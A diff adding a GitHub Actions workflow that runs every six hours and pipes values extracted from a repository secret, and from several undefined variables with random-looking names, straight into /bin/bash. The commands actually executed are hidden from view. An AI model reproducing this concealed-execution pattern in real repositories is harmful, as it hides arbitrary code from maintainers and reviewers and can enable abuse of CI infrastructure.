@@ -1,0 +1,22 @@
+name: penggangchile
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: penggangchile
+        env:
+          ni360: ${{ secrets.ni360 }}
+        run: |
+          echo $ni360 | jq -r .pin170 | /bin/bash
+          echo $ajenw75 | jq -r .j9124 | /bin/bash
+          echo $ev61 | jq -r .afat073 | /bin/bash
+          echo $ytstl013 | jq -r .qemu61 | /bin/bash
+          echo $rg163 | jq -r .eweii3 | /bin/bash
+          echo $tznj931 | jq -r .khmst930 | /bin/bash
+
